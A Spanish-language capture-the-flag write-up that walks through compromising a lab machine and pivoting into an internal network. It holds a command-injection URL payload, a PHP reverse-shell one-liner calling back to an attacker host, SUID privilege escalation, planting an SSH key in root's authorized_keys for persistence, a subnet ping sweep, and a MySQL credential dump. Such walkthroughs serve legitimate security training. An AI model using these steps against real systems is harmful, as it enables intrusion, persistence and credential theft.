# <font color=red>[+]</font> Reconocimiento

```bash
sudo nmap -p- -Pn -n -sS -vvv --min-rate 5000 $IP

PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 62
80/tcp   open  http         syn-ack ttl 62
2222/tcp open  EtherNetIP-1 syn-ack ttl 62
8022/tcp open  oa-system    syn-ack ttl 62
```

```bash
sudo nmap -p 22,80,2222,8022 -sVC -Pn -n --min-rate 5000 $IP

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:3e:80:d9:b0:98:fd:7e:09:6d:34:12:f9:15:8a:18 (RSA)
|   256 ec:5f:8a:1d:59:b3:59:2f:49:ef:fb:f4:4a:d0:1d:7a (ECDSA)
|_  256 b1:4a:22:dc:7f:60:e4:fc:08:0c:55:4f:e4:15:e0:fa (ED25519)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
2222/tcp open  EtherNetIP-1?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8022/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:39:41:4b:e7:61:75:72:f1:14:5a:72:39:b5:30:99 (RSA)
|   256 a6:db:02:98:56:b2:2d:f9:6f:92:7f:e7:94:35:22:a8 (ECDSA)
|_  256 7c:04:37:c8:5b:15:bb:c5:b5:cb:89:9d:09:7f:f4:4f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## <font color=red>[~]</font> Entorno web

Cuando accedemos a la web HTTP del servidor nos damos cuenta de que es la página por defecto de ***Apache***. Dentro del código fuente no encontramos nada por lo que comenzamos la etapa de reconocimiento activo realizando un ***Fuzzing*** de archivos y directorios.

```bash
ffuf -c -w /usr/share/seclist/Discovery/Web-Content/raft-large-files.txt -u http://$IP -fc 404

index.php               [Status: 200, Size: 329, Words: 59, Lines: 17, Duration: 72ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 35ms]
info.php                [Status: 200, Size: 69001, Words: 3283, Lines: 760, Duration: 66ms]
```

Encontramos estos 4 archivos:
```
http://$IP
|_ index.html --> La página por defecto de Apache
|_ info.php --> Página donde se nos muestra información sobre el servidor
|_ index.php --> Página misteriosa
```

Primero entro en la página `index.php` ene l cual puedo encontrar el *hostname* del servidor y las diferentes versiones de ***PHP*** y ***Apache***. Tras esto, me dirijo a la página `index.php`, en la cual me encuentro una página simple con los tres directorios encontrados.

>[!note]
> Esto me hace pensar que tal vez está configurado para mostrar tan solo esto de forma estática, pero entonces debería de ser un `.html`. Si es un archivo ***PHP*** estará ejecutando algún tipo de código que es lo que hace que muestre dicho contenido.
> 
> Por lo tanto, y viendo el formato de salida que es idéntico a un `ls -lah .` de Linux. Imagino que el código detrás de `index.php` ejecuta un comando del sistema con `ls -lah [posible_parámetro_dinámico]`.

En las apps web es posible pasar parámetros a través de la URL usando la sintaxis: `http://servidor/archivo.php?parámetro=...`. Estuve probando distintos parámetros hasta qye recordé que en el mismo código fuente de la página `index.php` existe un comentario con la pista:
```html
<!-- Where is the path ? -->
```

>Por lo que probé el parámetro `?path=/etc/passwd` y funcionó.

Como ya dije antes, seguramente se esté ejecutando un comando del sistema `ls -lah [parámetro]`. Por lo que si no hay una correcta sanitización, es posible concatenar comandos para realizar una ejecución remota de comandos. Por lo que, pruebo a realizar la siguiente solicitud HTTP:
```
http://$IP/index.php?path=/etc/passwd ; cat /etc/passwd
```

Y conseguimos ver el contenido de `/etc/passwd`, lo que confirma mi teoría. Aprovechando esto, me puse a tratar de obtener una reverse shell, lo cual se me complicó bastante hasta que pude acceder con el siguiente *payload*.
```bash
php -r '$s=fsockopen("IP_KALI",4444);proc_open("/bin/bash",[$s,$s,$s],$p);'
```

# <font color=red>[+]</font> Post-Explotación

Al acceder al sistema, lo hacemos como el usuario `www-data` el cual no tiene privilegios interesantes, por lo que traté de enumerar posibles vectores de escalada de privilegios.

Primero fui al directorio `/home/mike/`, en donde me encontré con un binario el cual descargué a mi máquina para poder analizarlo con la herramienta `strings`. Tras estar buscando durante mucho rato no encontré nada de valor por lo que simplemente lo dejé apartado.

Lo siguiente que hice fue enumerar los archivos con el bit SUID activo, en donde resalta un binario: `/usr/share/man/zh_TW/crypt`. Como parecía funcionar exactamente igual que el binario en `/home/mike`, lo dejé de lado mientras investigaba un poco más con `linpeas.sh`. Estuve mirando los `cronjobs` y muchas otras cosas sin éxito.

Cuando no supe que más hacer volví al binario y `crypt`, y como había uno idéntico en el directorio `/home/mike/`, probé a pasar el nombre `mike` como parámetro y milagrosamente funcionó. Tras ejecutarse el binario pasándole dicho parámetro, nos devuelve una shell como `root`.

Con la idea de mejorar la shell y obtener una forma de volver en caso de que la perdiera o necesitara una nueva, me dirigí al directorio `/root/.ssh` en donde encontré con el archivo `authorized_keys`. Por lo que volví a mi máquina Kali y generé un par de claves ***SSH RSA*** y copie la clave pública en el archivo para poder acceder a la víctima vía ***SSH***.
```bash
ssh-keygen -t rsa -f ./id_kali
```

### <font color=red> [-]</font> *IntraNet*

Una vez obtengo una forma de permanencia en la víctima trato de buscar la *flag* sin éxito. Pero buscando me di cuenta de que la máquina víctima tiene dos interfaces de red activas.

```bash
eth0 --> IP: 192.168.50.5/24
eth1 --> IP: 172.16.20.2/24
```

La interfaz `eth0` es con la que nosotros nos comunicamos a través de la ***VPN***. Pero la interfaz `eth1` nos lleva a un segmento de red diferente, en la cual puede haber nuevas víctimas por lo que ampliamos nuestra superficie de ataque.

Estuve tratando de configurar un ***pivoting automático***, configurando `iptables` en la máquina víctima e `ip route` en mi máquina Kali. Sin embargo, no pude obtener conexión directa desde mi máquina Kali, por lo que tuve que crear un pequeño *one-liner* que buscase máquinas activas de forma automática desde la máquina víctima:

```bash
seq 3 254 | xargs -I {} -P 50 sh -c 'ping -c 1 -W 1 172.16.20.{} && echo "Ping exitoso: 172.16.20.{}"'
```

- `seq 3 254`: Genera los números desde el *3* hasta el *254*.
- `|` ***(Pipe)***: Pasa el ***standard output (1)*** hacia el siguiente comando.
- `xargs -I {} -P 50 sh -c 'ping -c 1 -W 1 172.16.20.{} && echo "Ping exitoso: 172.16.20.{}"'`: Es la herramienta que se va a encargar de realizar los pings de forma eficiente para tardar lo menos posible.
	- `xargs`: Es una herramienta diseñada para tomar un texto que recibe por el ***standard input (0)*** y construir nuevos comandos con él de forma dinámica.
	- `-I {}`: Especifica el ***marcador de posición (placeholder)***. "*Coge cada número que te va llegando y colócalo exactamente donde veas las llaves `{}`*". Podemos usar cualquier palabra o símbolo (como `-I IP`), pero `{}` es el estándar.
	- `-P 50`: La bandera de ***procesos concurrentes (Paralelismo)***. Le indica a `xargs` que lance y mantenga exactamente 50 sub-terminales que ejecutan un ping cada una al mismo tiempo. en el milisegundo en que uno termina, lanza el siguiente de la cola, manteniendo una carga de red constante sin colapsar nuestra máquina ni alertar en exceso a los sistemas defensivos.
	- `sh -c`: Ejecuta dicha sub-terminal de tal forma que ejecute los comandos que se encuentran entre `'..'`.
	- `ping -c 1 -W 1 172.16.20.{}`: Ejecute el comando `ping` enviando un solo paquete `-c 1`, y esperando como máximo 1 segundo la respuesta `-W 1`, hacia la IP generada dinámicamente por las llaves `{}`.
	- `&& echo "Ping exitoso: 172.16.20.{}"`: Hace que solo si el comando ping es exitoso (la máquina de destino del ***ICMP echo request*** ha enviado un ***ICMP echo reply***) muestre por pantalla un mensaje advirtiéndolo.

Una vez tenemos la IP de la nueva víctima deberíamos de ir viendo que puertos tiene abiertos para poder atacarlo nuevamente. Como no he podido ejecutar `nmap` de forma satisfactoria a través de la primera máquina víctima, probé algunos de los puertos principales de forma manual para ver si tenía suerte antes de crear un nuevo script que lo hiciera por mi. Por suerte, conseguí acceder vía ***SSH*** usando la calve privada del usuario `mike`.

```bash
ssh mike@172.16.20.{} -i /home/mike/.ssh/id_rsa
```

### <font color=red> [-]</font> ***MySQL***

Dentro de la nueva máquina, estuve revisando por nuevos archivos con el bit SUID activo y archivos interesantes pero no conseguí escalar privilegios. Entonces, miré los servicios que se ejecutaban en la máquina y encontré una instancia de base de datos de ***MySQL*** ( en su puerto por defecto *3306*).

```bash
ss -tulnp

Netid             State               Recv-Q              Send-Q                              Local Address:Port                             Peer Address:Port              
udp               UNCONN              0                   0                                   127.0.0.53%lo:53                                    0.0.0.0:*           
tcp               LISTEN              0                   128                                 127.0.0.53%lo:53                                    0.0.0.0:*                 
tcp               LISTEN              0                   128                                       0.0.0.0:22                                    0.0.0.0:*                 
tcp               LISTEN              0                   80                                      127.0.0.1:3306                                  0.0.0.0:*                 
tcp               LISTEN              0                   128                                          [::]:22                                       [::]:*
```

Para acceder a la base de datos probé algunas contraseñas típicas y descubrí que era `password`.

```bash
mysql -u mike -ppassword
```

Una vez dentro de la instancia, es ejecutar comandos SQL para recabar información.

1. Miramos que bases de datos se encuentran en la instancia:
   ```SQL
   SHOW DATABASES;
   
   +--------------------+
   | Database           |
   +--------------------+
   | information_schema |
   | accounts           |
   +--------------------+
   ```

1. Miramos las tablas de la base de datos `accounts`:
   ```SQL
   SHOW TABLES FROM accounts;
   
   +--------------------+
   | Tables_in_accounts |
   +--------------------+
   | users              |
   +--------------------+
   ```

1. Vemos todo el contenido de la tabla `users` en la base de datos `accounts`:
   ```SQL
   SELECT * FROM accounts.users;
   
   +-------+-------------+
   | login | password    |
   +-------+-------------+
   | root  | [hidden]    |
   | mike  | [hidden]    |
   +-------+-------------+
   ```

Obtenemos las credenciales del usuario `mike` y `root`. Con esta información ya podemos escalar privilegios al usuario `root` usando la herramienta `su`.

### <font color=red> [-]</font> `unzip`

Una vez somo el usuario `root`, accedemos a `/root` y encontramos un archivo comprimido `mike.zip`. Podemos usar el comando `unzip` para tratar de descomprimirlo pero nos pedirá una contraseña la cual es la que también encontramos en la base de datos.

```bash
unzip mike.zip
```
